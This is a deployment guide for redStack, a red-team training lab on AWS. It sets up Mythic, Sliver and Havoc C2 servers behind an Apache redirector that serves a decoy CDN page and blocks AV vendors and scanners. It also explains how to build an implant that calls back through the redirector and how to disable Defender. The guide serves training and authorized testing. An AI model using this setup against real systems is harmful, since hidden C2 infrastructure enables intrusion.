# redStack: A Boot-to-Breach Lab Environment for Red Team Operators

> [!NOTE]
> redStack is now feature complete and supports both public internet deployments and closed environments (HTB/VL/PG) that use OpenVPN. This is actively being tested and debugged, so please reach out with any issues or concerns.

## Complete Deployment Walkthrough

**Purpose:** Step-by-step guide to deploy and verify your boot-to-breach lab environment
**Difficulty:** Intermediate to Advanced

> [!IMPORTANT]
> redStack is not a tutorial on how to use C2 frameworks. It is an environment that removes the infrastructure hurdle so you can focus on learning. The lab gives you a fully configured, production-style red team setup out of the box (Boot-to-Breach). What you do with it is up to you.

---

## Table of Contents

- [Architecture Overview](#architecture-overview)
- [Pre-Deployment Checklist](#pre-deployment-checklist)
- [Part 1: Initial Deployment](#part-1-initial-deployment)
- [Part 2: Verification](#part-2-verification)
- [Part 3: Apache Redirector Configuration](#part-3-apache-redirector-configuration)
- [Part 4: Mythic C2 Setup](#part-4-mythic-c2-setup)
- [Part 5: Sliver C2 Setup](#part-5-sliver-c2-setup)
- [Part 6: Havoc C2 Setup](#part-6-havoc-c2-setup)
- [Part 7: Final Validation](#part-7-final-validation)
- [External Target Environments (HTB/VL/PG)](#external-target-environments-htbvlpg)
- [Troubleshooting](#troubleshooting)

---

## Architecture Overview

```text
+----------------------------------------------------------------------+
|                    redStack Network Architecture                     |
+----------------------------------------------------------------------+

                          [ Operator ]
                       Browser / MobaXterm
                               |
                   HTTPS :443  |  SSH :22
                               |
+------------------------------+------------------------------+
|               TeamServer VPC (172.31.0.0/16)                |
|   +-----------------------------------------------------+   |
|   | guacamole                   Elastic IP: <Public IP>     |   |
|   | 172.31.x.x                                          |   |
|   +--+----+----+----+-------------------------------+---+   |
|      |    |    |    |   Guacamole-managed sessions  |       |
|     SSH  SSH  SSH  RDP                              |       |
|      |    |    |    |                               |       |
|   +--+  +-+  +-+--+-+---------+                     |       |
|   |     |    |    |           |                     |       |
|   v     v    v    v           v                     |       |
| +------++------++------+  +------------+            |       |
| |mythic||sliver||havoc |  |WIN-OPERATOR|            |       |
| |      ||      ||      |  |            |            |       |
| +------++------++------+  +------------+            |       |
|        ( no public IPs - internal only )            |       |
+------------------------------+----------------------+-------+       
                               |                              
           VPC Peering: 172.31.0.0/16 <-> 10.60.0.0/16        
           - C2 callbacks: Apache proxy -> teamservers
                               |                               
+------------------------------+------------------------------+
|                Redirector VPC (10.60.0.0/16)                |
|   +-----------------------------------------------------+   |
|   | redirector                  Elastic IP: <Public IP>     |   |
|   | 10.60.x.x                                           |   |
|   | Apache :80/:443 (X-Request-ID + URI validation)     |   |
|   | Decoy page served to unvalidated requests           |   |
|   +-----------------------------------------------------+   |
+------------------------------+------------------------------+
                               ^
                               |
                    public internet / cloud DNS
                               |
                               v
          [ Public Internet Accessible Target Evironments ]

Public Internet Environment (C2 Callback Flow):
  [target / implant] --HTTPS/HTTP--> public internet / cloud DNS
  --> redirector Elastic IP --> Apache (X-Request-ID + URI validation)
  --> VPC peering --> mythic / sliver / havoc (172.31.x.x)
```

> [!NOTE]
>
> - All C2 servers have no public IPs. Reachable only through the redirector via VPC peering
> - The redirector runs in its own isolated VPC, simulating an external provider
> - Every lab machine has `/etc/hosts` entries so all hostnames resolve across the environment
> - Requests without a valid `X-Request-ID` header receive a decoy CloudEdge CDN maintenance page
> - Only requests with a matching URI prefix and the correct header token are proxied to the correct C2 server
> - `redirect.rules` blocks AV vendors and TOR exits (403)
> - WireGuard keys are generated automatically at boot. No pre-deployment setup needed
> - Run `terraform output network_architecture` to see the diagram populated with your actual IPs

---

## Pre-Deployment Checklist

### Prerequisites

- [ ] AWS account with IAM credentials
- [ ] AWS CLI installed and configured
- [ ] Terraform >= 1.0 installed
- [ ] Your public IP obtained
- [ ] SSH key pair created in AWS EC2 (see Step 0.3 below)
- [ ] redstack_tf package extracted

### Step 0.1: Install AWS CLI & Terraform

**Install AWS CLI:**

| Platform | Command |
| -------- | ------- |
| macOS | `brew install awscli` |
| Linux (Ubuntu/Debian) | `sudo apt install awscli` |
| Linux (any) | `curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip" && unzip awscliv2.zip && sudo ./aws/install` |
| Windows | Download and run the MSI installer from <https://aws.amazon.com/cli/> |

**Configure AWS CLI:**

```bash
aws configure
```

You will be prompted for:

- **AWS Access Key ID** - from IAM Console → Users → Security credentials
- **AWS Secret Access Key** - shown once when creating the access key
- **Default region name** - `us-east-1` (or your preferred region)
- **Default output format** - `json`

> [!NOTE]
> If you don't have an access key yet, create one in the AWS Console:
> IAM → Users → [your user] → Security credentials → Create access key → CLI use case

**Install Terraform:**

| Platform | Command |
| -------- | ------- |
| macOS | `brew install terraform` |
| Linux (Ubuntu/Debian) | See <https://developer.hashicorp.com/terraform/install> |
| Windows | `choco install terraform` or download from <https://developer.hashicorp.com/terraform/install> |

**Checkpoint:** ✅ AWS CLI and Terraform installed

### Step 0.2: Verification Commands

**Windows (PowerShell):**

```powershell
# Check AWS access
aws sts get-caller-identity

# Check Terraform
terraform --version

# Get your public IP
curl -s ifconfig.me
```

**Linux/Mac (bash):**

```bash
# Check AWS access
aws sts get-caller-identity

# Check Terraform
terraform --version

# Get your public IP
curl -s ifconfig.me
```

**Expected Results:**

- AWS CLI returns your account details (Account, Arn, UserId)
- Terraform version 1.0 or higher
- Public IP address displayed

**Checkpoint:** ✅ AWS CLI and Terraform working, public IP noted

### Step 0.3: Create AWS SSH Key Pair (Required)

**Terraform does NOT create the SSH key pair - you must create it manually first.**

### Option 1: AWS Console (Recommended)

1. Open AWS Console → EC2 → Key Pairs
2. Click "Create key pair"
3. Name: `rs-rsa-key` (or your preferred name)
4. Key type: RSA
5. File format: `.pem` (for Linux/Mac/Windows OpenSSH)
6. Click "Create key pair"
7. **Save the downloaded .pem file** - you cannot download it again!
8. Move to project folder and set permissions:

**Windows (PowerShell):**

```powershell
# Move key to project folder (adjust path as needed)
Move-Item "$env:USERPROFILE\Downloads\rs-rsa-key.pem" ".\rs-rsa-key.pem"

# Fix permissions (required: OpenSSH rejects keys with open permissions)
icacls ".\rs-rsa-key.pem" /inheritance:r /grant:r "$($env:USERNAME):R"
```

**Linux/Mac (bash):**

```bash
mv ~/Downloads/rs-rsa-key.pem ./
chmod 400 ./rs-rsa-key.pem
```

### Option 2: AWS CLI

**Linux/Mac (bash):**

```bash
aws ec2 create-key-pair --key-name rs-rsa-key --query 'KeyMaterial' --output text > ./rs-rsa-key.pem
chmod 400 ./rs-rsa-key.pem
```

**Windows (PowerShell):**

```powershell
aws ec2 create-key-pair --key-name rs-rsa-key --query 'KeyMaterial' --output text | Out-File -Encoding ascii rs-rsa-key.pem
icacls "rs-rsa-key.pem" /inheritance:r /grant:r "$($env:USERNAME):R"
```

**Verify key pair exists:**

```bash
aws ec2 describe-key-pairs --key-names rs-rsa-key
```

**Checkpoint:** ✅ SSH key pair created and .pem file saved

---

## Part 1: Initial Deployment

### Objective: AWS Infrastructure Deployment

Deploy all AWS infrastructure using Terraform: VPCs, security groups, EC2 instances (Mythic, Sliver, Havoc, Guacamole, Windows, Apache redirector).

### Step 1.1: Configure Terraform Variables

```bash
cp terraform.tfvars.example terraform.tfvars
nano terraform.tfvars   # Linux/Mac
notepad terraform.tfvars  # Windows
```

**Required Changes (no defaults, must be set):**

```hcl
localPub_ip          = "YOUR_IP/32"           # Replace with your IP + /32
ssh_key_name         = "rs-rsa-key"           # Must match your AWS key pair name
ssh_private_key_path = "./rs-rsa-key.pem"     # Path to your .pem file (for Windows password decryption)
```

> [!NOTE]
> **Default deployment uses a public domain with htaccess filtering enabled.** This is the standard mode for real-world use and is what the rest of this guide assumes. The closed environment option below is only for HTB/VL/PG Pro Labs and other isolated OpenVPN environments where no public DNS exists.
>
> **Open environment** (default: internet access, domain registered):
> Set `redirector_domain` to your domain. Complete Step 1.6 (DNS) and Step 3.1 (Certbot) to get a trusted TLS certificate. Agents call back using your domain over HTTPS. Scanner/AV blocking via `redirect.rules` is enabled by default.
>
> ```hcl
> redirector_domain = "c2.yourdomain.tld"
> ```
>
> **Closed environment** (HTB/VL/PG Pro Labs, OpenVPN-only, no public DNS):
> Leave `redirector_domain` empty and set the two CTF toggles below. The redirector uses its public Elastic IP as the server identity with a self-signed certificate. Scanner/AV blocking is disabled since it is not needed in lab environments. Skip Step 1.6 and Step 3.1. See Part 8 for the full CTF deployment workflow.
>
> ```hcl
> # redirector_domain = ""                    # leave empty; redirector uses its public IP
> enable_external_vpn                  = true  # enables OpenVPN client + VPC routing
> enable_redirector_htaccess_filtering = false  # disables scanner/AV blocking (not needed in labs)
> ```

**Optional:** these have sensible defaults but affect callback URLs baked into payloads and VPN routing. Review before deploying:

```hcl
# Instance types: adjust for budget/performance
sliver_instance_type = "t3.small"
havoc_instance_type  = "t3.medium"

# C2 URI prefixes (CDN/cloud-style paths on the redirector)
# These are baked into payloads at deploy time. Customize before deploying.
mythic_uri_prefix = "/cdn/media/stream"
sliver_uri_prefix = "/cloud/storage/objects"
havoc_uri_prefix  = "/edge/cache/assets"

# --- CTF/Pro Lab mode (HTB/VL/PG via OpenVPN) ---
# Default is open-environment (public domain + htaccess on). Only change these for CTF/Pro Lab use.
enable_external_vpn                  = false  # Set to true for HTB/VL/PG. Enables OpenVPN client + VPC routing (see Part 8)
enable_redirector_htaccess_filtering = true   # Set to false for HTB/VL/PG. Scanner/AV blocking not needed in lab environments

# C2 header validation is always enabled. These override the defaults:
# c2_header_name  = "X-Request-ID"  # Header name (default: X-Request-ID)
# c2_header_value = ""              # Token value. Leave empty to auto-generate (recommended)

# Optional: custom tags applied to every AWS resource (instances, SGs, Elastic IPs, etc.)
# Useful for cost tracking and filtering resources in the AWS Console
tags = {
  Owner      = "Operator"
  CostCenter = "redStack"
  Purpose    = "Boot-to-Breach Training Environment"
}
```

> [!NOTE]
> **Header validation is always enabled.** `c2_header_name` and `c2_header_value` are optional overrides, not toggles. Leaving them out means the header name defaults to `X-Request-ID` and the token is auto-generated at deploy time. Retrieve the active token after deployment with `terraform output deployment_info`.

Passwords are auto-generated during deployment. A single random password is used for SSH and Guacamole admin access. The Windows Administrator password is generated by AWS and decrypted automatically using your SSH private key. Retrieve credentials after deployment with:

```bash
terraform output deployment_info
```

**Checkpoint:** ✅ File saved with your actual values

### Step 1.2: Initialize Terraform

```bash
terraform init
```

**Expected Output:**

```text
Initializing the backend...
Initializing provider plugins...
- Finding hashicorp/aws versions matching "~> 5.0"...
- Installing hashicorp/aws v5.x.x...
Terraform has been successfully initialized!
```

**Checkpoint:** ✅ No errors, providers downloaded

### Step 1.3: Review Deployment Plan

```bash
terraform plan
```

**Expected Output:**

- **~50+ resources** to be created
- 6 EC2 instances (Mythic, Sliver, Havoc, Guacamole, Windows, Redirector)
- 2 VPCs (team server VPC + redirector VPC)
- 2 Elastic IPs (Guacamole, Redirector) - **static, persistent IPs**
- Mythic, Sliver, and Havoc have **no public IPs** (internal only)
- Security groups, VPC peering, route tables
- No errors or warnings

**Checkpoint:** ✅ Plan shows expected resources

### Step 1.4: Deploy Infrastructure

```bash
terraform apply
```

Type `yes` when prompted.

**Expected Output:**

```text
Apply complete! Resources: 50+ added, 0 changed, 0 destroyed.
```

**Checkpoint:** ✅ Terraform apply completed successfully

### Step 1.5: Save Deployment Information

```bash
terraform output deployment_info
terraform output network_architecture
```

> [!NOTE]
> There are two outputs: `deployment_info` (all IPs, credentials, SSH commands) and `network_architecture` (diagram with actual IPs). All connection details you need for the rest of this guide are in `deployment_info`. Save it to a file:
>
> **Windows (PowerShell):**
>
> ```powershell
> terraform output deployment_info | Out-File -Encoding utf8 deployment_info.txt
> ```
>
> **Linux/Mac (bash):**
>
> ```bash
> terraform output deployment_info > deployment_info.txt
> ```

**Checkpoint:** ✅ Output saved, network diagram displayed

### Step 1.6: Point Domain to Redirector

> [!NOTE]
> **Closed environment (no DNS):** Skip this step entirely. No domain or DNS record is needed. Proceed to Part 2.

After deployment, you need to point your domain's DNS to the redirector's Elastic IP so that Certbot can obtain a valid SSL certificate.

**Get the Redirector IP:**

```bash
terraform output deployment_info
```

Look for the **APACHE REDIRECTOR** section. The `Public IP` field is what you need.

**Create a DNS A Record:**

1. Log into your domain registrar or DNS provider (e.g., Namecheap, Cloudflare, Route53)
2. Navigate to DNS settings for your domain
3. Create an **A record** pointing to the redirector's Elastic IP:

| Domain type | Host/Name field | Example |
| ----------- | --------------- | ------- |
| Apex domain | `@` | `yourdomain.tld` → redirector IP |
| Subdomain | subdomain only (e.g., `sub`) | `sub.yourdomain.tld` → redirector IP |

- **Value/Points to:** The redirector's Elastic IP from the command above
- **TTL:** 300 (5 minutes) or lowest available

**Verify DNS Propagation** (substitute your actual `redirector_domain` value from `terraform.tfvars`):

**Windows (PowerShell):**

```powershell
Resolve-DnsName yourdomain.tld
```

**Linux/Mac (bash):**

```bash
dig +short yourdomain.tld
```

**Expected:** The IP returned should match your redirector's Elastic IP.

> [!NOTE]
> DNS propagation can vary. Once DNS resolves correctly, proceed to Part 3 to run Certbot and configure the redirector.

**Checkpoint:** ✅ Domain pointed to redirector IP, DNS verified

### Wait Time: 5-10 Minutes

**Why:** User data scripts are installing software on multiple servers

**What's Happening:**

- All hosts: Setting descriptive hostnames and populating /etc/hosts for cross-host name resolution
- Mythic (`mythic`): Installing Docker, cloning Mythic, starting ~10 containers (Debian 12)
- Sliver (`sliver`): Installing Sliver C2 server binary, configuring firewall (Debian 12)
- Havoc (`havoc`): Installing Go, cloning and building Havoc teamserver from source (Debian 12)
- Guacamole (`guac`): Setting up PostgreSQL, Nginx, Docker containers (Debian 12)
- Windows (`WIN-OPERATOR`): Disabling Defender/Firewall, enabling RDP, installing tools (Chromium, VS Code, MobaXterm, 7-Zip)
- Redirector (`redirector`): Installing Apache with mod_rewrite/proxy, configuring header+URI validation, downloading redirect.rules, setting up SSL and decoy page (Debian 12, fully automated)

---

## Part 2: Verification

### Objective: Confirm Lab is Operational

Verify all components are accessible before moving to C2 setup. All credentials and IPs come from:

```bash
terraform output deployment_info
```

> **Pre-configured hostnames** are written to `/etc/hosts` on every Linux machine and `C:\Windows\System32\drivers\etc\hosts` on Windows during deployment. Use hostnames (`mythic`, `sliver`, `havoc`, `guac`, `redirector`, `win-operator`) instead of IPs from anywhere inside the lab.

### Step 2.1: Access Guacamole Portal

Open in your browser:

```text
https://<GUAC_PUBLIC_IP>/guacamole
```

- Username: `guacadmin`
- Password: from `terraform output deployment_info`

After logging in you should see **7 pre-configured connections**:

1. **Windows Operator Workstation** (RDP): auto-connects with Administrator credentials
2. **Mythic C2 Server (SSH)**
3. **Guacamole Server (SSH)**
4. **Apache Redirector (SSH)**
5. **Sliver C2 Server (SSH)**
6. **Havoc C2 Server (SSH)**
7. **Havoc C2 Desktop (VNC)**: XFCE4 desktop with the Havoc GUI client

All SSH connections use password auth (no keys needed) pre-configured with the auto-generated lab password.

**Checkpoint:** ✅ Guacamole accessible, 7 connections visible

### Step 2.2: Access Windows Workstation

1. Click **"Windows Operator Workstation"**
2. RDP connects automatically. Wait 10–30 seconds for the desktop to load.
3. Verify the following are installed: Chromium, VS Code, MobaXterm, 7-Zip
4. Open MobaXterm. The **redStack Lab** folder in the sidebar should contain pre-configured SSH sessions for all lab machines.

**If the connection fails:** Wait 5 more minutes. Windows is the slowest component to initialize.

**Checkpoint:** ✅ Windows desktop accessible, tools present, MobaXterm sessions visible

### Step 2.3: Verify Internal Connectivity

From the Windows workstation open **PowerShell** and ping the lab machines to confirm hostname resolution and network connectivity:

```powershell
ping mythic
ping sliver
ping havoc
ping redirector
ping guac
```

**Expected:** All hostnames resolve and respond.

**Checkpoint:** ✅ All lab machines reachable by hostname from Windows

---

## Part 3: Apache Redirector Configuration

### Objective: Configure and Understand the Redirector

This section covers the one manual step required after deployment (SSL certificate), then walks through the pre-configured security layers.

### Step 3.1: Obtain SSL Certificate

> [!NOTE]
> **Closed environment (no DNS):** Skip this step. A self-signed certificate with your redirector's public IP as the Subject Alternative Name was generated automatically at deploy time. Agents and test commands work over both HTTP and HTTPS using the IP directly. Proceed to Step 3.2.

Once DNS has propagated (Step 1.6), SSH to the redirector and run Certbot.

**Three ways to get a shell on the redirector (pick one):**

| Method | How |
| ------ | --- |
| From your host workstation | `ssh -i rs-rsa-key.pem admin@<REDIR_PUBLIC_IP>` (use `.pem` key) |
| Via Guacamole | Click **"Apache Redirector (SSH)"** in the Guacamole portal |
| From Windows workstation | Open MobaXterm → **redStack Lab** → **Apache Redirector (SSH)** |

**Windows (PowerShell):**

```powershell
ssh -i ".\rs-rsa-key.pem" admin@<REDIR_PUBLIC_IP>
```

**Linux/Mac (bash):**

```bash
ssh -i rs-rsa-key.pem admin@<REDIR_PUBLIC_IP>
```

> [!NOTE]
> **What is Certbot?** Certbot is a free, open-source tool from the Electronic Frontier Foundation (EFF) that automates obtaining and renewing TLS certificates from Let's Encrypt. Running it against the Apache server automatically provisions a trusted certificate, updates the HTTPS VirtualHost config, and sets up a cron job for auto-renewal. No manual certificate management required.

```bash
sudo certbot --apache -d yourdomain.tld
```

Certbot will walk you through a few prompts:

```text
Saving debug log to /var/log/letsencrypt/letsencrypt.log
Enter email address (used for urgent renewal and security notices)
 (Enter 'c' to cancel): you@youremail.com

- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Please read the Terms of Service at
https://letsencrypt.org/documents/LE-SA-v1.6-August-18-2025.pdf. You must agree
in order to register with the ACME server. Do you agree?
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
(Y)es/(N)o: Y

- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Would you be willing, once your first certificate is successfully issued, to
share your email address with the Electronic Frontier Foundation, a founding
partner of the Let's Encrypt project and the non-profit organization that
develops Certbot? We'd like to send you email about our work encrypting the web,
EFF news, campaigns, and ways to support digital freedom.
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
(Y)es/(N)o: N
Account registered.
Requesting a certificate for yourdomain.tld

Successfully received certificate.
Certificate is saved at: /etc/letsencrypt/live/yourdomain.tld/fullchain.pem
Key is saved at:         /etc/letsencrypt/live/yourdomain.tld/privkey.pem
This certificate expires on 2026-05-27.
These files will be updated when the certificate renews.
Certbot has set up a scheduled task to automatically renew this certificate in the background.

Deploying certificate
Successfully deployed certificate for yourdomain.tld to /etc/apache2/sites-enabled/redirector-https.conf
Added an HTTP->HTTPS rewrite in addition to other RewriteRules; you may wish to check for overall consistency.
Congratulations! You have successfully enabled HTTPS on https://yourdomain.tld
```

Certbot automatically updates the Apache HTTPS config and configures auto-renewal.

```bash
exit
```

**Checkpoint:** ✅ SSL certificate issued, HTTPS active on redirector

### Step 3.2: Run the Connectivity Test

A pre-installed script checks the full redirector stack in one command:

```bash
sudo /home/admin/test_redirector.sh
```

**Key sections of expected output:**

```text
===== Redirector Connectivity Test =====

[*] Apache status:
● apache2.service - The Apache HTTP Server
     Active: active (running) ...

[*] Enabled Apache modules:
 deflate_module (shared)
 headers_module (shared)
 proxy_module (shared)
 proxy_http_module (shared)
 rewrite_module (shared)
 ssl_module (shared)

[*] Active VirtualHosts:
*:80                   yourdomain.tld (.../redirector-http.conf:1)
*:443                  yourdomain.tld (.../redirector-https.conf:1)

[*] Testing direct backend connectivity:
  Mythic: OK
  Sliver: FAILED
  Havoc:  FAILED

[*] Testing decoy page (no header - should get CloudEdge CDN page):
<!DOCTYPE html>
<html lang="en">
...

[*] Testing C2 routing WITH correct header:
< HTTP/1.1 404 Not Found

[*] Testing C2 routing WITHOUT header (should get decoy):
< HTTP/1.1 200 OK

[*] Header validation:
  Header:  X-Request-ID: <your-token>

[*] URI routing (requires correct header):
  /cdn/media/stream/ -> Mythic  (10.50.x.x)
  /cloud/storage/objects/ -> Sliver  (10.50.x.x)
  /edge/cache/assets/ -> Havoc   (10.50.x.x)
```

> [!NOTE]
> **Sliver and Havoc show FAILED.** This is expected. C2 listeners for Sliver and Havoc have not been started yet (covered in Parts 5 and 6). Mythic shows OK because its HTTP port is reachable before a listener is configured. Re-run this script after completing Parts 5 and 6 to confirm all three backends are reachable.
>
> **C2 routing WITH header returns 404.** The request was proxied to Mythic (header check passed) but Mythic has no listener running yet, so it returns 404. This is correct. If the decoy page is returned instead, the header value is wrong.
>
> **C2 routing WITHOUT header returns 200.** The decoy page is served correctly when no valid header is present.

**Checkpoint:** ✅ Apache active, required modules loaded, VirtualHosts on 80/443, decoy page and header validation working

### Step 3.3: Review Configuration

**SSH to redirector** (substitute your actual redirector IP):

```bash
ssh -i rs-rsa-key.pem admin@<REDIR_PUBLIC_IP>
```

**View Active VirtualHosts:**

```bash
sudo apache2ctl -S
```

This shows all configured VirtualHosts (HTTP and HTTPS on ports 80/443).

**View HTTP Config (all C2 routes in one file):**

```bash
sudo cat /etc/apache2/sites-available/redirector-http.conf
```

**View HTTPS Config:**

```bash
sudo cat /etc/apache2/sites-available/redirector-https.conf
```

Each VirtualHost uses three security layers before proxying traffic:

1. **redirect.rules**: Blocks known AV vendors, cloud sandboxes, security scanners, and TOR exit nodes (returns 403)
2. **Header validation**: Requires `X-Request-ID` header with a specific token value
3. **URI prefix routing**: Only matching URI prefixes are proxied to C2 backends

**Checkpoint:** ✅ Understand the three-layer security model

### Step 3.4: Security Layer Details

#### Layer 1: redirect.rules (Automated Scanner Blocking)

The file `/etc/apache2/redirect.rules` is downloaded at boot from the public [redRules GitHub repo](https://github.com/BaddKharma/redRules), which maintains an adapted version of [curi0usJack's redirect rules](https://gist.github.com/curi0usJack/971385e8334e189d93a6cb4671238b10):

- All `302` redirects replaced with `403 Forbidden` responses
- Setup directives stripped (`Define REDIR_TARGET`, `RewriteEngine On`, `RewriteOptions Inherit`)
- AWS/Azure/cloud IP blocks **commented out** (would block our own AWS-hosted C2 callbacks)
- Included in both HTTP and HTTPS VirtualHosts via `Include /etc/apache2/redirect.rules`

```bash
# Check installed rules
grep -c 'RewriteCond' /etc/apache2/redirect.rules
```

To update redirect.rules manually:

```bash
# Re-download from redRules repo
curl -sL "https://raw.githubusercontent.com/BaddKharma/redRules/main/redirect.rules" \
  -o /etc/apache2/redirect.rules
sudo systemctl reload apache2
```

### Layer 2: Header Validation

Requests must include the correct `X-Request-ID` header. Without it, Apache serves the CloudEdge CDN decoy page instead of proxying to C2 backends.

Get the required header value from your local machine:

```bash
terraform output deployment_info
# Look for: C2 Header: X-Request-ID: <token>
```

### Layer 3: URI Prefix Routing

| URI Prefix | Backend | Forwarded as |
| ---------- | ------- | ------------ |
| `/cdn/media/stream/` | Mythic | Prefix stripped → Mythic receives `/callback` |
| `/cloud/storage/objects/` | Sliver | Prefix stripped → Sliver receives `/session` |
| `/edge/cache/assets/` | Havoc | Full path preserved → Havoc receives `/edge/cache/assets/update` |

Mythic and Sliver have the URI prefix stripped before forwarding. Havoc receives the full path including the prefix. This is required because Havoc's listener validates URIs against the same paths embedded in the demon.

**Checkpoint:** ✅ Understand header validation, URI routing, and scanner blocking

### Step 3.5: Test the Security Layers

> [!IMPORTANT]
> `curl` is blocked by redirect.rules (it's in the suspicious User-Agent list). All manual tests must use a browser-like User-Agent with `-A`.

```bash
# Set a browser User-Agent for testing
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
HEADER_VALUE="<token from terraform output deployment_info>"
TARGET="yourdomain.tld"          # or <REDIR_PUBLIC_IP> for IP-only/closed environments

# Should get DECOY PAGE (no header)
curl -sk -A "$UA" https://$TARGET/

# Should get DECOY PAGE (wrong header value)
curl -sk -A "$UA" -H "X-Request-ID: wrong-value" https://$TARGET/cdn/media/stream/test

# Should be PROXIED to Mythic (connection refused/timeout if no listener running yet, expected)
curl -sk -A "$UA" -H "X-Request-ID: $HEADER_VALUE" https://$TARGET/cdn/media/stream/test
```

**Checkpoint:** ✅ Security layers verified

### Step 3.6: Review Logs

All C2 traffic is logged to separate access/error log files:

```bash
# SSH to redirector first
ssh -i rs-rsa-key.pem admin@<REDIR_PUBLIC_IP>

# HTTP access log
sudo tail -50 /var/log/apache2/redirector-access.log
sudo tail -50 /var/log/apache2/redirector-error.log

# HTTPS access log
sudo tail -50 /var/log/apache2/redirector-ssl-access.log
sudo tail -50 /var/log/apache2/redirector-ssl-error.log
```

**Checkpoint:** ✅ Redirector logging understood

---

## Part 4: Mythic C2 Setup

> [!IMPORTANT]
> Mythic is a collaborative C2 framework built by Cody Thomas with a modern web-based GUI accessible through a browser. It uses a modular architecture where agents (called "payloads") and communication profiles are installed separately as Docker containers, making it highly extensible. Mythic is GUI-driven and includes a built-in task manager, file browser, and credential storage, making it well suited for multi-operator engagements.

### Objective: Mythic Proof-of-Function

The goal here is not to learn Mythic. It's to confirm the environment works end-to-end by getting a Windows `.exe` beacon to call back through the redirector. Once you have a callback, the lab is proven functional.

For full documentation on Mythic's capabilities, refer to the [official Mythic docs](https://docs.mythic-c2.net).

### Step 4.0: Verify Pre-Installed Profiles and Agents

The HTTP C2 profile and Apollo agent are installed automatically by the setup script. Verify they are present before proceeding:

```bash
cd /opt/Mythic
sudo ./mythic-cli status
```

Look for `apollo` and `http` under **Installed Services**. Both should show `running`.

**If either is missing, install manually:**

```bash
cd /opt/Mythic
sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http
sudo ./mythic-cli install github https://github.com/MythicAgents/apollo

# Restart to load new components
sudo ./mythic-cli stop
sleep 10
sudo ./mythic-cli start
```

**Checkpoint:** ✅ `apollo` and `http` both running under Installed Services

### Step 4.1: Verify HTTP C2 Profile is Running

**Access Mythic UI (from Windows workstation via Guacamole RDP):**

```text
https://mythic:7443
```

- Login: `mythic_admin`
- Password: `sudo cat /opt/Mythic/.env | grep MYTHIC_ADMIN_PASSWORD` (run on Mythic server)

**Navigate:** Installed Services → **C2** tab

The `http` profile should already show:

- **Container Status:** Online
- **C2 Server Status:** Accepting Connections

If it shows **Stopped**, click **"Start Profile"**.

**Checkpoint:** ✅ C2 Server Status shows "Accepting Connections"

### Step 4.2: Generate Agent

**Navigate:** Click **Create Payload** in the left sidebar

The wizard has 5 steps:

**Step 1: Select Target OS:** Windows

**Step 2: Configure Payload:** Select **Apollo** and set build parameters:

| Build Parameter | Value |
| --------------- | ----- |
| Output Format | `WinExe` (Windows Executable) |

**Step 3: Select Commands:** Select all, or at minimum: `shell`, `download`, `upload`, `screenshot`

**Step 4: Select C2 Profiles:**

1. In the dropdown, select **http** and click **+ INCLUDE PROFILE**
2. The profile expands below. Configure the following fields:

| Field | Value |
| ----- | ----- |
| `callback_host` | `https://yourdomain.tld` (domain) or `https://<REDIR_PUBLIC_IP>` (IP-only/closed env) |
| `callback_port` | `443` |
| `callback_interval` | `10` |
| `callback_jitter` | `20` |
| `post_uri` | `cdn/media/stream/update` (no leading `/`) |
| `headers` | Add a row. KEY: `X-Request-ID`, VALUE: `<token from terraform output deployment_info>` |
| `encrypted_exchange_check` | Leave enabled (default) |

**Step 5: Build:** Click **Next**, give the payload a name (e.g. `apollo-training`), then click **Create Payload**

**Wait:** 30-60 seconds. A popup notifies you when done. Go to **Payloads** in the sidebar and click the green download icon.

**Checkpoint:** ✅ Agent `.exe` downloaded

### Step 4.3: Deploy Agent

The Mythic UI runs in the **Windows workstation browser**, so `apollo.exe` is already on the Windows workstation after the download in the previous step. Open `C:\Users\Administrator\Downloads\` in File Explorer and double-click `apollo.exe` to run it.

**Extracting the agent to your host machine:**

Apollo (and all agents built in this lab) are unobfuscated by default. To get the binary to your host, zip it on the Windows workstation and copy it into the `GuacShare on Guacamole RDP\Download\` folder (visible in Windows Explorer under **This PC**). The Guacamole HTML5 sidebar will then show the file as a clickable download, which triggers a browser download to your host machine.

> [!WARNING]
> Windows Defender and most AV solutions will flag unobfuscated C2 agents on download or execution. Before downloading `apollo.zip` to your host, disable real-time protection or add your download folder as an exclusion. Any victim VM or target environment you run the agent in will also need AV disabled or exempted, unless you are specifically practicing AV evasion techniques.

**Zip and place in GuacShare (Windows Explorer):**

1. Navigate to `C:\Users\Administrator\Downloads\`, right-click `apollo.exe`, and select **Compress to ZIP file** (or **Send to → Compressed (zipped) folder**)
2. Open **This PC → GuacShare on Guacamole RDP → Download** and copy `apollo.zip` into it

Then press `Ctrl+Alt+Shift` in Guacamole, click **Devices**, and click `apollo.zip` to download it to your host machine. From there, transfer it to your victim environment or lab VM as needed.

**Watch Mythic UI:**

- Click the **phone icon** (top nav) to open **Active Callbacks**
- A new row should appear within ~10 seconds showing `WIN-OPERATOR`, the administrator user, and the private IP

**Checkpoint:** ✅ Callback row appears in Active Callbacks

### Step 4.4: Test C2 Session

**In the Active Callbacks table**, click the callback's **ID button** (blue = low integrity, red = high) to open the tasking pane below.

**Issue a test command** by typing in the task input box:

```bash
shell whoami
```

**Expected output:** `win-operator\administrator`

**Verify Redirector Traffic (on redirector via SSH):**

```bash
sudo tail -f /var/log/apache2/redirector-ssl-access.log
```

**Look for:** Regular GET/POST requests to `/cdn/media/stream/status` and `/cdn/media/stream/update`

**Checkpoint:** ✅ C2 traffic flowing through redirector to Mythic

---

## Part 5: Sliver C2 Setup

> [!IMPORTANT]
> Sliver is an open-source C2 framework developed by BishopFox, designed as a modern alternative to Cobalt Strike for red team operations. It supports multiple communication protocols (HTTP/S, DNS, mTLS, WireGuard) and cross-compiles implants for Windows, Linux, and macOS. Sliver is primarily CLI-driven through an interactive console, with multiplayer support allowing multiple operators to connect to a shared server daemon simultaneously.

### Objective: Sliver Proof-of-Function

Same goal as Part 4: get a Windows `.exe` implant calling back through the redirector to confirm Sliver is working. This is a proof-of-function run, not a Sliver deep-dive.

